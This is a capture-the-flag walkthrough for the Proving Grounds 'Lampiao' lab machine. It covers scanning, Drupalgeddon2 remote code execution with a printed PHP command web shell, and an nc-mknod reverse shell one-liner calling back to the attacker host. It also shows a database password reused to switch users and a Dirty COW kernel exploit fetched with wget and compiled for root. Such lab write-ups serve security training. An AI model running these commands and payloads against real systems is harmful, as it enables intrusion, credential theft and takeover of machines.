---
layout: default
title: Lampiao
parent: Proving Grounds Play
nav_order: 22
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.243.48
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 22:21 EST
Nmap scan report for 192.168.243.48
Host is up (0.068s latency).
Not shown: 65514 closed tcp ports (reset), 18 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings:
|   GetRequest:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Lampi\xC3\xA3o
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
```

# Enumeration

---

## 1898 | HTTP

This appears to be a Drupal site.

### wfuzz

We find serveral directories including _/profiles_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://192.168.243.48:1898/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.243.48:1898/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000030:   301        9 L      28 W       321 Ch      "misc"
000000033:   301        9 L      28 W       325 Ch      "profiles"
000000024:   301        9 L      28 W       323 Ch      "themes"
000000014:   301        9 L      28 W       324 Ch      "scripts"
000000005:   301        9 L      28 W       324 Ch      "modules"
000000004:   301        9 L      28 W       325 Ch      "includes"
000000047:   301        9 L      28 W       322 Ch      "sites"
000004255:   200        192 L    661 W      11420 Ch    "http://192.168.243.48:1898/"
000004227:   403        10 L     30 W       296 Ch      "server-status"
```

Looking at _/profiles_ we see _/testing_ and several files including a _testing.info_ file.

![profiles](../../../assets/images/ctfs/proving_grounds/lampiao/profiles.png)

This indicates the version of Drupal is _7.5_

![version](../../../assets/images/ctfs/proving_grounds/lampiao/version.png)

# Exploitation

---

This version should be vulnerable to _Drupalgeddon2_ which there is an RCE exploit in _searchsploit_

![searchsploit](../../../assets/images/ctfs/proving_grounds/lampiao/searchsploit.png)

Copy the _44449.rb_ exploit to the current directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ searchsploit -m 44449.rb
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/vagrant/Documents/PG/PLAY/lampiao/44449.rb


```

This exploit requires the _highline_ gem.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ sudo gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 1 seconds
1 gem installed

```

Now we can run the exploit and get a reverse shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ ruby 44449.rb http://192.168.226.48:1898
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.226.48:1898/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.226.48:1898/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo OXGANKQN
[+] Result : OXGANKQN
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.226.48:1898/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.226.48:1898/shell.php' -d 'c=hostname'
lampiao>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Get a Stable Shell

Use _revshellgen_ to generate a _nc-mknod_ reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

Run this one-liner in the PHP shell on the target.

```bash
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!

lampiao>> rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l
[!] WARNING: Detected an known bad character (>)

```

We get a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.226.48] 56476
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Enumerate Users

Locate user _tiago_

## Review settings.php

The default Drupal configuration files are located in _sites/default/settings.php_

```bash

www-data@lampiao:/var/www/html/sites/default$ less settings.php

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'Virgulino',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Discovered password Virgulino
{: .warn }

## Pivot to user Tiago

We can use the discovered password _Virgulino_ to switch to the _Tiago_ user.

```bash
www-data@lampiao:/var/www/html/sites/default$ su tiago
Password:
tiago@lampiao:/var/www/html/sites/default$ id
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)

```

## Run Linpeas

Download _linpeas_ and execute

The Linux version is 4.4.0-31-generic which should be vulnerable to the _dirty cow_ kernel exploit.

![linpeas](../../../assets/images/ctfs/proving_grounds/lampiao/linpeas.png)

[Dirty Cow Exploit Raw Code](https://www.exploit-db.com/exploits/40847)

Transfer the exploit to the taget machine.

```bash
tiago@lampiao:/tmp$ wget http://192.168.45.217:8000/40847.cpp
wget http://192.168.45.217:8000/40847.cpp
--2023-11-07 00:52:23--  http://192.168.45.217:8000/40847.cpp
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10531 (10K) [text/x-c++src]
Saving to: ‘40847.cpp’

100%[======================================>] 10,531      --.-K/s   in 0.003s

2023-11-07 00:52:23 (3.22 MB/s) - ‘40847.cpp’ saved [10531/10531]

```

Compile the exploit using _g++_

```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
```

Now we just compile and execute the exploit and get root access.

```bash
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
<ll -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
tiago@lampiao:/tmp$ ls
ls
40847.cpp  dirtycow2  l  vmware-root
tiago@lampiao:/tmp$ ./dirtycow2
./dirtycow2
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
tiago@lampiao:/tmp$ su root
su root
Password: dirtyCowFun

root@lampiao:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)

```
